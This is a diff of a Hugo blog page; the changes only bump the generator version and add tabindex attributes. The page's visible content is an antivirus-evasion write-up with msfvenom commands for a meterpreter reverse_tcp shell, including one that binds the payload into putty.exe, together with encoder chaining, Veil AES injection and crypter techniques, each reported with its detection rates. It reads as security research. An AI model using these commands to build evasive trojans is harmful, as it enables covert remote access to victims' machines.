@@ -93,7 +93,7 @@
 <script>$(document).on('click', function () { $('.collapse').collapse('hide'); })</script>
 
 
-<script src="/js/confetti.browser.js"></script> <meta name="generator" content="Hugo 0.85.0" />
+<script src="/js/confetti.browser.js"></script> <meta name="generator" content="Hugo 0.96.0" />
     
 
     
@@ -300,7 +300,7 @@
 <p><img src="/img/crypt0r/results.png" alt="AES Parameters"></p>
 <h1 id="open-source-evasion-techniques">Open Source Evasion Techniques</h1>
 <p>All of the following results are based on a meterpreter file which was generated like this:</p>
-<pre><code>msfvenom
+<pre tabindex="0"><code>msfvenom
   -p windows/meterpreter/reverse_tcp
   --platform windows
   -f exe
@@ -322,7 +322,7 @@
 </table>
 <h2 id="binder">Binder</h2>
 <p>This technique basically combines two executables, a malicious and an ordinary one, into one file. The malicious code will be executed in a separate thread upon startup. This command was used to generate a meterpreter shell in combination with the SSH client PuTTY:</p>
-<pre><code>msfvenom
+<pre tabindex="0"><code>msfvenom
   -p windows/meterpreter/reverse_tcp
   --platform windows
   -x putty.exe
@@ -365,7 +365,7 @@
 	</tr>
 </table>
 <p>No change in detection rates - let&rsquo;s combine multiple encoders and the binding technique:</p>
-<pre><code>msfvenom -p windows/meterpreter/reverse_tcp
+<pre tabindex="0"><code>msfvenom -p windows/meterpreter/reverse_tcp
   LHOST=192.168.1.1
   LPORT 1337
   -f raw
@@ -396,9 +396,9 @@ msfvenom -a x86
 </code></pre><p>This yields 30/56 - better but still not zero.</p>
 <h2 id="using-veil">Using Veil</h2>
 <p>Using <a href="https://www.veil-framework.com/">Veil</a>, hiding payloads becomes quite easy using a built-in assistant. Using</p>
-<pre><code>python/shellcode_inject/aes_encrypt
+<pre tabindex="0"><code>python/shellcode_inject/aes_encrypt
 </code></pre><p>in combination with Pyherion and a shellcode for</p>
-<pre><code>windows/meterpreter/reverse_tcp
+<pre tabindex="0"><code>windows/meterpreter/reverse_tcp
 </code></pre><p>decreases the detection rate down to 19/56.</p>
 <h2 id="crypters">Crypters</h2>
 <p>Crypters encrypt the malicious shellcode using a secure encryption algorithm. To execute the payload at runtime, the so called stub brute forces the built-in encrypted shellcode in order to invoke it. Using AES-128 and a delayed decryption, it was possible to decrease the detection down to zero for both scantime and runtime. The runtime detection bypass basically delays the start of the decryption routine by performing unnecessary actions like:</p>
